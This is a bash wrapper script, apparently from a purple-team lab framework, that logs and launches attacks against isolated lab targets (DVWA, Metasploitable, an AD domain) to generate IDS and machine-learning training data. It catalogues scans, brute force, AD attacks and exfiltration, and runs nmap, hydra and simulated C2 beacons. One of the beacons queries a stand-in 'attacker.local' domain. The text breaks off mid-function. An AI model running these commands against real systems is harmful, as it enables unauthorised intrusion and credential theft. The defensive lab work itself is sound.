#!/bin/bash
###############################################################################
# PURPLE TEAM ATTACK FRAMEWORK - SOC-ML
# Main wrapper script for logging and executing attacks
#
# Usage: ./run_attack.sh [OPTIONS] <attack_type> ["notes"]
#
# Options:
#   --auto-confirm, --yes, -y   Skip interactive confirmation prompt
#   --campaign-id <id>          Campaign ID appended to notes field
#   -l, --list                  List available attacks
#   -h, --help                  Show help
###############################################################################

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ATTACK_LOG="${SCRIPT_DIR}/attack_log.csv"
RESULTS_BASE="${SCRIPT_DIR}/results"
SCRIPTS_DIR="${SCRIPT_DIR}/scripts"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"
MSF_DIR="${SCRIPT_DIR}/metasploit"

# Source configs
source "${SCRIPT_DIR}/configs/targets.conf" 2>/dev/null || true

# Source IP (sear on VLAN 20)
SOURCE_IP="10.10.20.20"

# Targets (VLAN 40 only!)
DVWA_IP="${DVWA_IP:-10.10.40.10}"
JUICE_IP="${JUICE_IP:-10.10.40.10}"
JUICE_PORT="${JUICE_PORT:-3000}"
METASPLOIT_IP="${METASPLOIT_IP:-10.10.40.20}"
WINDOWS_IP="${WINDOWS_IP:-10.10.40.21}"
WORDPRESS_IP="${WORDPRESS_IP:-10.10.40.30}"
CRAPI_IP="${CRAPI_IP:-10.10.40.31}"
SERVICES_FTP_IP="${SERVICES_FTP_IP:-10.10.40.32}"
SERVICES_SMTP_IP="${SERVICES_SMTP_IP:-10.10.40.42}"
SERVICES_SNMP_IP="${SERVICES_SNMP_IP:-10.10.40.43}"
HONEYPOT_IP="${HONEYPOT_IP:-10.10.40.33}"
HONEYPOT_HTTP_PORT="${HONEYPOT_HTTP_PORT:-8080}"

# AD Lab targets (VLAN 30 — restricted scope)
AD_DC_IP="${AD_DC_IP:-10.10.30.40}"
AD_WS_IP="${AD_WS_IP:-10.10.30.41}"
AD_DOMAIN="${AD_DOMAIN:-lab.local}"

TARGET_SUBNET="10.10.40.0/24"

# Automation flags
AUTO_CONFIRM=false
CAMPAIGN_ID=""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║          PURPLE TEAM ATTACK FRAMEWORK - SOC-ML                ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_help() {
    print_banner
    echo "Usage: ./run_attack.sh [OPTIONS] <attack_type> [\"notes\"]"
    echo ""
    echo "Options:"
    echo "  --auto-confirm, --yes, -y   Skip interactive confirmation"
    echo "  --campaign-id <id>          Campaign ID (appended to notes)"
    echo "  -l, --list                  List available attacks"
    echo "  -h, --help                  Show this help"
    echo ""
    echo "Example:"
    echo "  ./run_attack.sh web_sqli_union \"Testing DVWA with low security\""
    echo "  ./run_attack.sh --yes --campaign-id CAMP-001 recon_syn \"Automated\""
}

list_attacks() {
    print_banner
    echo -e "${GREEN}Available Attacks:${NC}"
    echo ""
    echo -e "${YELLOW}Web Application (DVWA):${NC}"
    echo "  web_sqli_union      - UNION-based SQL injection"
    echo "  web_sqli_blind      - Blind SQL injection"
    echo "  web_sqli_time       - Time-based SQL injection"
    echo "  web_lfi             - Local File Inclusion"
    echo "  web_cmdi            - Command Injection"
    echo "  web_xss             - Cross-Site Scripting"
    echo "  web_path_traversal  - Path traversal attacks"
    echo "  web_config_hunt     - Configuration file discovery"
    echo "  web_log4shell       - Log4Shell probes"
    echo "  web_dirbusting      - Directory enumeration"
    echo "  web_nikto           - Nikto vulnerability scan"
    echo "  web_full_exploit    - All web exploits combined"
    echo ""
    echo -e "${YELLOW}Juice Shop:${NC}"
    echo "  juice_sqli          - SQL injection against Juice Shop"
    echo "  juice_xss           - XSS attacks against Juice Shop"
    echo "  juice_auth_bypass   - Authentication bypass"
    echo "  juice_bola          - Broken Object Level Auth"
    echo "  juice_file_upload   - Malicious file upload"
    echo "  juice_full          - All Juice Shop attacks"
    echo "  juice_dirbusting    - Directory enumeration"
    echo ""
    echo -e "${YELLOW}Credential Attacks:${NC}"
    echo "  cred_login          - Web login brute force"
    echo "  cred_wordpress      - WordPress login simulation"
    echo "  cred_xmlrpc         - XML-RPC multicall attack"
    echo "  cred_stuffing       - Credential stuffing"
    echo "  cred_enum           - User enumeration"
    echo "  cred_slow           - Slow brute force (evasion)"
    echo "  cred_full           - All credential attacks"
    echo ""
    echo -e "${YELLOW}Reconnaissance:${NC}"
    echo "  recon_syn           - SYN scan (Target subnet)"
    echo "  recon_full          - Full TCP connect scan"
    echo "  recon_udp           - UDP scan"
    echo "  recon_version       - Version detection"
    echo "  recon_os            - OS fingerprinting"
    echo "  recon_aggressive    - Aggressive scan (-A)"
    echo "  recon_slow          - Slow stealth scan"
    echo ""
    echo -e "${YELLOW}Brute Force (Metasploitable):${NC}"
    echo "  brute_ssh           - SSH brute force"
    echo "  brute_ftp           - FTP brute force"
    echo "  brute_telnet        - Telnet brute force"
    echo "  brute_mysql         - MySQL brute force"
    echo "  brute_postgres      - PostgreSQL brute force"
    echo ""
    echo -e "${YELLOW}C2 Simulation:${NC}"
    echo "  c2_beacon_http      - HTTP beaconing"
    echo "  c2_beacon_dns       - DNS beaconing"
    echo "  c2_exfil_http       - HTTP exfiltration"
    echo "  c2_jitter           - Jittered beacon intervals"
    echo ""
    echo -e "${YELLOW}SMB/NetBIOS Attacks:${NC}"
    echo "  smb_enum            - SMB share/user enumeration"
    echo "  smb_brute           - SMB credential brute force"
    echo "  smb_relay           - SMB relay simulation"
    echo "  smb_full            - All SMB attacks"
    echo ""
    echo -e "${YELLOW}SSH Attacks:${NC}"
    echo "  ssh_enum            - SSH user enumeration"
    echo "  ssh_banner          - SSH banner grabbing"
    echo "  ssh_cipher_enum     - SSH cipher enumeration"
    echo "  ssh_full            - All SSH attacks"
    echo ""
    echo -e "${YELLOW}DNS Attacks:${NC}"
    echo "  dns_zone_transfer   - DNS zone transfer attempt"
    echo "  dns_tunnel          - DNS tunneling simulation"
    echo "  dns_enum            - Reverse DNS enumeration"
    echo "  dns_full            - All DNS attacks"
    echo ""
    echo -e "${YELLOW}Database Attacks:${NC}"
    echo "  db_mysql            - MySQL exploitation"
    echo "  db_postgres         - PostgreSQL exploitation"
    echo "  db_credential_spray - Database credential spray"
    echo "  db_full             - All database attacks"
    echo ""
    echo -e "${YELLOW}SNMP Attacks:${NC}"
    echo "  snmp_enum           - SNMP community brute + walk"
    echo "  snmp_full           - All SNMP attacks"
    echo ""
    echo -e "${YELLOW}Nikto Scanning:${NC}"
    echo "  nikto_dvwa          - Nikto scan against DVWA"
    echo "  nikto_juice         - Nikto scan against Juice Shop"
    echo "  nikto_evasion       - Nikto with IDS evasion techniques"
    echo "  nikto_full          - Nikto against all web targets"
    echo ""
    echo -e "${YELLOW}Evasion Techniques:${NC}"
    echo "  evasion_frag        - Fragmented packet scans"
    echo "  evasion_decoy       - Decoy scans"
    echo "  evasion_slow        - Ultra-slow scanning"
    echo "  evasion_encoding    - Encoded payloads"
    echo "  evasion_full        - All evasion techniques"
    echo ""
    echo -e "${YELLOW}Data Exfiltration:${NC}"
    echo "  exfil_http          - HTTP exfiltration simulation"
    echo "  exfil_dns           - DNS exfiltration simulation"
    echo "  exfil_icmp          - ICMP tunnel simulation"
    echo "  exfil_full          - All exfiltration techniques"
    echo ""
    echo -e "${YELLOW}API Attacks (crAPI):${NC}"
    echo "  api_bola            - Broken Object Level Auth"
    echo "  api_bfla            - Broken Function Level Auth"
    echo "  api_mass_assign     - Mass assignment"
    echo "  api_jwt             - JWT manipulation"
    echo "  api_graphql         - GraphQL introspection/injection"
    echo "  api_full            - All API attacks"
    echo ""
    echo -e "${YELLOW}WordPress Attacks:${NC}"
    echo "  wp_enum             - WPScan enumeration"
    echo "  wp_brute            - wp-login brute force"
    echo "  wp_xmlrpc           - XML-RPC multicall amplification"
    echo "  wp_plugin           - Plugin vulnerability scanning"
    echo "  wp_full             - All WordPress attacks"
    echo ""
    echo -e "${YELLOW}Windows Attacks (MS3):${NC}"
    echo "  win_rdp_brute       - RDP brute force"
    echo "  win_iis_scan        - IIS vulnerability scanning"
    echo "  win_winrm           - WinRM enumeration"
    echo "  win_smb_ms17        - EternalBlue scanning"
    echo "  win_full            - All Windows attacks"
    echo ""
    echo -e "${YELLOW}Windows MS3 Expanded:${NC}"
    echo "  win_ftp_brute       - FTP brute force (port 21)"
    echo "  win_ssh_brute       - SSH brute force (port 22)"
    echo "  win_mysql_attack    - MySQL exploitation (port 3306)"
    echo "  win_glassfish       - GlassFish admin/traversal (port 4848/8080)"
    echo "  win_struts          - Apache Struts RCE (port 8282)"
    echo "  win_jenkins         - Jenkins script console (port 8484)"
    echo "  win_wamp            - WAMP/phpMyAdmin (port 8585)"
    echo "  win_elasticsearch   - Elasticsearch RCE (port 9200)"
    echo "  win_manageengine    - ManageEngine exploitation (port 8020)"
    echo ""
    echo -e "${YELLOW}WAF/Honeypot Attacks:${NC}"
    echo "  waf_sqli_bypass     - SQLi CRS bypass payloads"
    echo "  waf_xss_bypass      - XSS CRS bypass payloads"
    echo "  waf_path_bypass     - Path traversal CRS bypass"
    echo "  waf_rce_bypass      - RCE/command injection bypass"
    echo "  waf_protocol_abuse  - HTTP smuggling/verb tampering"
    echo "  waf_scanner_evasion - Nikto evasion + UA rotation"
    echo "  waf_rate_flood      - Rate-based anomaly threshold"
    echo "  waf_fingerprint     - WAF technology detection"
    echo "  waf_full            - All WAF evasion attacks"
    echo ""
    echo -e "${RED}Active Directory (VLAN 30 — RESTRICTED):${NC}"
    echo "  ad_ldap_enum        - LDAP anonymous bind + enumeration"
    echo "  ad_kerb_enum        - Kerberos user enumeration"
    echo "  ad_kerberoast       - Kerberoasting (TGS ticket extraction)"
    echo "  ad_asrep_roast      - AS-REP roasting"
    echo "  ad_password_spray   - Password spray (5 passwords, 30s cooldown)"
    echo "  ad_bloodhound       - BloodHound collection"
    echo "  ad_dcsync           - DCSync hash extraction (requires DA)"
    echo "  ad_lateral_pth      - Pass-the-Hash lateral movement"
    echo "  ad_zerologon        - CVE-2020-1472 CHECK only"
    echo "  ad_full             - Full AD attack chain"
    echo ""
    echo -e "${YELLOW}Lateral Movement:${NC}"
    echo "  lateral_scan        - Sequential multi-host scanning"
    echo "  lateral_cred_reuse  - Credential reuse across hosts"
    echo "  lateral_pivot       - Pivot simulation"
    echo "  lateral_full        - All lateral movement"
    echo ""
    echo -e "${YELLOW}OWASP Top 10:${NC}"
    echo "  owasp_injection     - A03:2021 Injection"
    echo "  owasp_auth          - A07:2021 Auth Failures"
    echo "  owasp_ssrf          - A10:2021 SSRF"
    echo "  owasp_full          - All OWASP Top 10"
    echo ""
    echo -e "${YELLOW}Metasploit Modules:${NC}"
    echo "  msf_vsftpd          - vsftpd 2.3.4 backdoor"
    echo "  msf_distcc          - DistCC command execution"
    echo "  msf_postgres        - PostgreSQL login scanner"
    echo "  msf_mysql           - MySQL login scanner"
    echo "  msf_ms17_010        - EternalBlue scanner"
    echo "  msf_tomcat          - Tomcat WAR upload"
    echo "  msf_java_rmi        - Java RMI deserialization"
    echo "  msf_ssh_enum        - SSH user enumeration"
    echo "  msf_smb_shares      - SMB share enumeration"
    echo "  msf_smb_users       - SMB user enumeration"
    echo "  msf_telnet          - Telnet credential scanner"
    echo "  msf_iis_webdav      - IIS WebDAV exploit"
    echo "  msf_rdp_scan        - RDP vulnerability scanner"
    echo "  msf_glassfish_traversal - GlassFish directory traversal"
    echo "  msf_struts_rce      - Struts2 OGNL RCE"
    echo "  msf_jenkins_script  - Jenkins script console exploit"
    echo "  msf_elasticsearch_rce - Elasticsearch MVEL RCE"
    echo "  msf_manageengine    - ManageEngine deserialization"
    echo "  msf_win_ftp         - MS3 Windows FTP login scanner"
    echo "  msf_ad_smb_login    - AD SMB login scanner"
    echo "  msf_ad_psexec       - AD PSExec lateral movement"
    echo ""
    echo -e "${YELLOW}Noise Attacks — Scanning:${NC}"
    echo "  noise_masscan         - Masscan full subnet scan"
    echo "  noise_nmap_allports   - Nmap all 65535 ports"
    echo "  noise_nmap_scripts    - Nmap all NSE scripts"
    echo "  noise_httpx_probe     - httpx HTTP probe subnet"
    echo "  noise_httpx_targets   - httpx target enumeration"
    echo "  noise_nuclei_full     - Nuclei full template scan"
    echo "  noise_nuclei_cves     - Nuclei CVE-only scan"
    echo ""
    echo -e "${YELLOW}Noise Attacks — Web:${NC}"
    echo "  noise_sqlmap_max      - SQLmap maximum intensity"
    echo "  noise_xss_polyglot    - XSS polyglot payload spray"
    echo "  noise_cmdi_all        - Command injection all OS variants"
    echo "  noise_lfi_deep        - LFI deep traversal"
    echo "  noise_dirb_huge       - Dirb huge wordlist scan"
    echo "  noise_spring4shell    - Spring4Shell probe"
    echo "  noise_shellshock      - Shellshock probe"
    echo "  noise_ffuf_dirs       - ffuf directory fuzzing"
    echo "  noise_ffuf_params     - ffuf parameter fuzzing"
    echo "  noise_feroxbuster     - Feroxbuster recursive scan"
    echo "  noise_dalfox_scan     - Dalfox XSS scan"
    echo "  noise_dalfox_pipe     - Dalfox piped XSS scan"
    echo "  noise_commix_scan     - Commix command injection scan"
    echo ""
    echo -e "${YELLOW}Noise Attacks — Brute Force:${NC}"
    echo "  noise_hydra_ssh_max     - Hydra SSH maximum intensity"
    echo "  noise_hydra_ftp_max     - Hydra FTP maximum intensity"
    echo "  noise_hydra_telnet_max  - Hydra Telnet maximum intensity"
    echo "  noise_hydra_mysql_max   - Hydra MySQL maximum intensity"
    echo "  noise_hydra_rdp_max     - Hydra RDP maximum intensity"
    echo "  noise_medusa_parallel   - Medusa parallel brute force"
    echo "  noise_cme_brute         - CrackMapExec SMB brute force"
    echo "  noise_patator_http      - Patator HTTP brute force"
    echo ""
    echo -e "${YELLOW}Noise Attacks — Metasploit:${NC}"
    echo "  noise_msf_shells        - Metasploit reverse shells"
    echo "  noise_msf_meterpreter   - Metasploit meterpreter sessions"
    echo ""
    echo -e "${YELLOW}Noise Attacks — C2/Exfil:${NC}"
    echo "  noise_sliver_http       - Sliver HTTP beacon simulation"
    echo "  noise_beacon_rapid      - Rapid 1s beacon interval"
    echo "  noise_dnscat2           - DNScat2 tunnel simulation"
    echo "  noise_iodine            - Iodine DNS tunnel simulation"
    echo "  noise_ptunnel           - ICMP tunnel simulation"
    echo "  noise_exfil_large_http  - Large HTTP exfiltration"
    echo "  noise_exfil_large_dns   - Large DNS exfiltration"
    echo "  noise_exfil_encoded     - Encoded chunk exfiltration"
    echo ""
    echo -e "${YELLOW}Noise Attacks — Network/Impacket:${NC}"
    echo "  noise_impacket_psexec     - Impacket PSExec"
    echo "  noise_impacket_wmiexec    - Impacket WMIExec"
    echo "  noise_impacket_smbexec    - Impacket SMBExec"
    echo "  noise_impacket_atexec     - Impacket AtExec"
    echo "  noise_impacket_pth        - Impacket Pass-the-Hash all"
    echo "  noise_secretsdump         - Impacket secretsdump"
    echo "  noise_responder_analyze   - Responder analyze mode"
    echo "  noise_snmp_walk_full      - SNMP full MIB walk"
    echo "  noise_dns_axfr_all        - DNS AXFR all targets"
    echo ""
    echo -e "${YELLOW}Noise Attacks — Active Directory:${NC}"
    echo "  noise_kerbrute_users      - Kerbrute user enumeration"
    echo "  noise_kerbrute_passwords  - Kerbrute password spray"
    echo "  noise_bloodhound_all      - BloodHound all collection methods"
    echo "  noise_rubeus_kerberoast   - Kerberoasting (Impacket)"
    echo "  noise_rubeus_asrep        - AS-REP roasting (Impacket)"
    echo "  noise_cme_spray           - CrackMapExec password spray"
    echo "  noise_cme_pth             - CrackMapExec Pass-the-Hash"
    echo "  noise_certipy_find        - Certipy AD CS enumeration"
    echo "  noise_certipy_esc1        - Certipy ESC1 exploitation"
    echo "  noise_certipy_shadow      - Certipy shadow credentials"
    echo "  noise_coercer_scan        - Coercer scan"
    echo "  noise_coercer_coerce      - Coercer coerce"
    echo "  noise_ldapdomaindump      - LDAPDomainDump full dump"
    echo ""
    echo -e "${YELLOW}Gap Attacks — C2 Simulation:${NC}"
    echo "  gap_cobalt_beacon       - Cobalt Strike beacon simulation"
    echo "  gap_cobalt_stager       - Cobalt Strike stager simulation"
    echo "  gap_meterpreter_https   - Meterpreter HTTPS simulation"
    echo "  gap_meterpreter_tcp     - Meterpreter reverse TCP simulation"
    echo "  gap_empire_stager       - Empire stager simulation"
    echo "  gap_mythic_c2           - Mythic C2 HTTP simulation"
    echo "  gap_havoc_demon         - Havoc Demon simulation"
    echo ""
    echo -e "${YELLOW}Gap Attacks — Encrypted/Protocol:${NC}"
    echo "  gap_tls_nonstandard     - TLS on non-standard ports"
    echo "  gap_tls_anomalies       - TLS certificate anomalies"
    echo "  gap_tls_jitter          - TLS beaconing with jitter"
    echo "  gap_http2_flood         - HTTP/2 flood"
    echo "  gap_websocket_abuse     - WebSocket abuse"
    echo ""
    echo -e "${YELLOW}Gap Attacks — Cryptomining:${NC}"
    echo "  gap_stratum_mining      - Stratum mining protocol simulation"
    echo "  gap_xmrig_pattern       - XMRig traffic pattern simulation"
    echo "  gap_coinhive_pattern    - CoinHive traffic pattern simulation"
    echo ""
    echo -e "${YELLOW}Gap Attacks — Beaconing:${NC}"
    echo "  gap_beacon_base64       - Base64 beacon exfiltration"
    echo "  gap_beacon_dns_txt      - DNS TXT beacon"
    echo "  gap_beacon_icmp         - ICMP covert beacon"
    echo "  gap_beacon_headers      - HTTP header covert beacon"
    echo ""
    echo -e "${YELLOW}Gap Attacks — Anomalous Traffic:${NC}"
    echo "  gap_large_posts         - Large POST request exfiltration"
    echo "  gap_high_frequency      - High frequency request flood"
    echo "  gap_ua_anomalies        - User-Agent anomaly simulation"
    echo "  gap_exe_downloads       - EXE download pattern simulation"
    echo "  gap_staged_download     - Staged download simulation"
}

# Initialize attack log if not exists
init_log() {
    if [[ ! -f "$ATTACK_LOG" ]]; then
        echo "attack_id,timestamp_start,timestamp_end,category,subcategory,technique_id,tool,source_ip,target_ip,target_port,target_service,success,notes" > "$ATTACK_LOG"
    fi
}

# Generate attack ID
gen_attack_id() {
    echo "ATK-$(date +%Y%m%d-%H%M%S)"
}

# Log attack start
log_start() {
    local attack_id="$1"
    local category="$2"
    local subcategory="$3"
    local technique="$4"
    local tool="$5"
    local target_ip="$6"
    local target_port="$7"
    local service="$8"
    local notes="$9"
    
    TIMESTAMP_START=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo -e "║  ATTACK: ${YELLOW}$category/$subcategory${CYAN}"
    echo "╠═══════════════════════════════════════════════════════════════╣"
    echo -e "║  ID:        ${GREEN}$attack_id${CYAN}"
    echo -e "║  Category:  $category/$subcategory"
    echo -e "║  Technique: $technique"
    echo -e "║  Tool:      $tool"
    echo -e "║  Source:    $SOURCE_IP"
    echo -e "║  Target:    $target_ip:$target_port ($service)"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Log attack completion
log_complete() {
    local attack_id="$1"
    local category="$2"
    local subcategory="$3"
    local technique="$4"
    local tool="$5"
    local target_ip="$6"
    local target_port="$7"
    local service="$8"
    local success="$9"
    local notes="${10}"
    
    TIMESTAMP_END=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    
    # Append to CSV
    echo "$attack_id,$TIMESTAMP_START,$TIMESTAMP_END,$category,$subcategory,$technique,$tool,$SOURCE_IP,$target_ip,$target_port,$service,$success,\"$notes\"" >> "$ATTACK_LOG"
    
    # Create results directory
    RESULTS_DIR="${RESULTS_BASE}/${attack_id}"
    mkdir -p "$RESULTS_DIR"
    
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║  ATTACK LOGGED                                                ║"
    echo "╠═══════════════════════════════════════════════════════════════╣"
    echo -e "║  ID:      $attack_id"
    echo -e "║  Start:   $TIMESTAMP_START"
    echo -e "║  End:     $TIMESTAMP_END"
    echo -e "║  Success: $success"
    echo -e "║  Results: $RESULTS_DIR/"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
    echo -e "${YELLOW}Remember: Wait 2-5 minutes for Suricata to process before extracting ML data${NC}"
}

# Confirm attack (skipped with --auto-confirm)
confirm_attack() {
    if [[ "$AUTO_CONFIRM" == "true" ]]; then
        echo -e "${GREEN}Auto-confirmed (campaign mode)${NC}"
        return 0
    fi
    echo -e "${YELLOW}Confirm target is in VLAN 40 (Targets network)${NC}"
    read -p "Proceed with attack? (y/N): " confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo "Attack cancelled"
        exit 0
    fi
}

###############################################################################
# ATTACK EXECUTION FUNCTIONS
###############################################################################

run_web_exploit() {
    local subtype="$1"
    local notes="$2"
    local attack_id=$(gen_attack_id)
    
    log_start "$attack_id" "web" "$subtype" "T1190" "custom" "$DVWA_IP" "80" "http" "$notes"
    confirm_attack
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."
    
    if [[ -f "${SCRIPTS_DIR}/web_exploits.sh" ]]; then
        bash "${SCRIPTS_DIR}/web_exploits.sh" "$subtype" "$DVWA_IP" "80" "${RESULTS_BASE}/${attack_id}"
    else
        echo "Web exploits script not found, using fallback..."
        curl -s "http://${DVWA_IP}/" -o /dev/null
    fi
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
    log_complete "$attack_id" "web" "$subtype" "T1190" "custom" "$DVWA_IP" "80" "http" "true" "$notes"
}

run_credential_attack() {
    local subtype="$1"
    local notes="$2"
    local attack_id=$(gen_attack_id)
    
    log_start "$attack_id" "credential" "$subtype" "T1110" "custom" "$DVWA_IP" "80" "http" "$notes"
    confirm_attack
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."
    
    if [[ -f "${SCRIPTS_DIR}/credential_attacks.sh" ]]; then
        bash "${SCRIPTS_DIR}/credential_attacks.sh" "$subtype" "$DVWA_IP" "80" "${RESULTS_BASE}/${attack_id}"
    else
        echo "Credential attacks script not found"
    fi
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
    log_complete "$attack_id" "credential" "$subtype" "T1110" "custom" "$DVWA_IP" "80" "http" "true" "$notes"
}

run_recon() {
    local subtype="$1"
    local notes="$2"
    local attack_id=$(gen_attack_id)
    local target="$TARGET_SUBNET"
    
    case "$subtype" in
        syn) 
            NMAP_OPTS="-sS -T4 --top-ports 1000"
            ;;
        full)
            NMAP_OPTS="-sT -T4 -p-"
            target="$DVWA_IP"
            ;;
        udp)
            NMAP_OPTS="-sU -T4 --top-ports 100"
            target="$DVWA_IP"
            ;;
        version)
            NMAP_OPTS="-sV -T4 --top-ports 100"
            target="$DVWA_IP"
            ;;
        os)
            NMAP_OPTS="-O -T4"
            target="$DVWA_IP"
            ;;
        aggressive)
            NMAP_OPTS="-A -T4"
            target="$DVWA_IP"
            ;;
        slow)
            NMAP_OPTS="-sS -T1 --top-ports 100"
            target="$DVWA_IP"
            ;;
    esac
    
    log_start "$attack_id" "recon" "${subtype}_scan" "T1046" "nmap" "$target" "*" "network" "$notes"
    confirm_attack
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."
    nmap $NMAP_OPTS "$target"
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
    
    log_complete "$attack_id" "recon" "${subtype}_scan" "T1046" "nmap" "$target" "*" "network" "true" "$notes"
}

run_brute_force() {
    local service="$1"
    local notes="$2"
    local attack_id=$(gen_attack_id)
    local port
    
    case "$service" in
        ssh) port=22 ;;
        ftp) port=21 ;;
        telnet) port=23 ;;
        mysql) port=3306 ;;
        postgres) port=5432 ;;
    esac
    
    log_start "$attack_id" "brute" "${service}_password" "T1110.001" "hydra" "$METASPLOIT_IP" "$port" "$service" "$notes"
    confirm_attack
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."
    
    # Use small wordlist for speed
    hydra -L "${WORDLISTS_DIR}/small_users.txt" \
          -P "${WORDLISTS_DIR}/small_passwords.txt" \
          -t 4 -f \
          "${METASPLOIT_IP}" "$service" 2>&1 || true
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
    log_complete "$attack_id" "brute" "${service}_password" "T1110.001" "hydra" "$METASPLOIT_IP" "$port" "$service" "true" "$notes"
}

run_c2_beacon() {
    local subtype="$1"
    local notes="$2"
    local attack_id=$(gen_attack_id)
    
    log_start "$attack_id" "c2" "${subtype}" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$notes"
    confirm_attack
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."
    
    case "$subtype" in
        http_beacon)
            for i in {1..30}; do
                curl -s "http://${DVWA_IP}/" \
                    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
                    -H "X-Session-ID: $(openssl rand -hex 8)" \
                    -o /dev/null &
                sleep 10
            done
            wait
            ;;
        jitter)
            for i in {1..20}; do
                curl -s "http://${DVWA_IP}/" -o /dev/null &
                sleep $((RANDOM % 15 + 5))
            done
            wait
            ;;
        dns)
            for i in {1..30}; do
                nslookup "beacon-${i}-$(openssl rand -hex 4).attacker.local" "${DVWA_IP}" 2>/dev/null || true
                sleep 5
            done
            ;;
    esac
    
    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
    log_complete "$attack_id" "c2" "$subtype" "T1071.001" "custom" "$DVWA_IP" "80" "http" "true" "$notes"
}

###############################################################################
# GENERIC SCRIPT RUNNER
###############################################################################

run_script_attack() {
    local script_name="$1"
    local subtype="$2"
    local category="$3"
    local technique="$4"
    local tool="$5"
    local target_ip="$6"
    local target_port="$7"
    local service="$8"
    local notes="$9"
    local attack_id=$(gen_attack_id)

    log_start "$attack_id" "$category" "$subtype" "$technique" "$tool" "$target_ip" "$target_port" "$service" "$notes"
    confirm_attack

    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack starting..."

    local script_path="${SCRIPTS_DIR}/${script_name}"
    if [[ -f "$script_path" ]]; then
        bash "$script_path" "$subtype" "$target_ip" "$target_port" "${RESULTS_BASE}/${attack_id}" || true
    else
        echo -e "${RED}Script not found: $script_path${NC}"
    fi

    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Attack complete"
    log_complete "$attack_id" "$category" "$subtype" "$technique" "$tool" "$target_ip" "$target_port" "$service" "true" "$notes"
}

run_msf_attack() {
    local rc_name="$1"
    local target_ip="$2"
    local target_port="$3"
    local category="$4"
    local subcategory="$5"
    local technique="$6"
    local notes="$7"
    local attack_id=$(gen_attack_id)

    log_start "$attack_id" "$category" "$subcategory" "$technique" "metasploit" "$target_ip" "$target_port" "msf" "$notes"
    confirm_attack

    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Metasploit attack starting..."

    if [[ -f "${MSF_DIR}/msf_wrapper.sh" ]]; then
        bash "${MSF_DIR}/msf_wrapper.sh" "${MSF_DIR}/rc/${rc_name}" "$target_ip" "$target_port" "${RESULTS_BASE}/${attack_id}" || true
    else
        echo -e "${RED}Metasploit wrapper not found${NC}"
    fi

    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} Metasploit attack complete"
    log_complete "$attack_id" "$category" "$subcategory" "$technique" "metasploit" "$target_ip" "$target_port" "msf" "true" "$notes"
}

###############################################################################
# AD ATTACK RUNNER (VLAN 30 — RESTRICTED)
###############################################################################

run_ad_attack() {
    local subtype="$1"
    local category="$2"
    local technique="$3"
    local tool="$4"
    local target_ip="$5"
    local target_port="$6"
    local service="$7"
    local notes="$8"
    local attack_id=$(gen_attack_id)

    # VLAN 30 IP validation
    if [[ ! "$target_ip" =~ ^10\.10\.30\.[0-9]+$ ]]; then
        echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║  SAFETY ABORT: Target IP '$target_ip' is NOT in VLAN 30      ║${NC}"
        echo -e "${RED}║  AD attacks are restricted to 10.10.30.0/24 only.            ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
        exit 1
    fi

    log_start "$attack_id" "$category" "$subtype" "$technique" "$tool" "$target_ip" "$target_port" "$service" "$notes"

    # Stricter confirmation for VLAN 30
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║  ⚠  WARNING: VLAN 30 (Lab Network) TARGET                    ║"
    echo "║  This attack targets Active Directory infrastructure.        ║"
    echo "║  Target: ${target_ip}:${target_port}"
    echo "║  Domain: ${AD_DOMAIN}"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"

    if [[ "$AUTO_CONFIRM" == "true" ]]; then
        echo -e "${GREEN}Auto-confirmed (campaign mode)${NC}"
    else
        read -p "Type CONFIRM-AD to proceed: " confirm
        if [[ "$confirm" != "CONFIRM-AD" ]]; then
            echo "Attack cancelled — required 'CONFIRM-AD'"
            exit 0
        fi
    fi

    echo -e "${GREEN}[$(date -u +%Y-%m-%dT%H:%M:%SZ)]${NC} AD attack starting..."

    local script_path="${SCRIPTS_DIR}/ad_attacks.sh"
    if [[ -f "$script_path" ]]; then
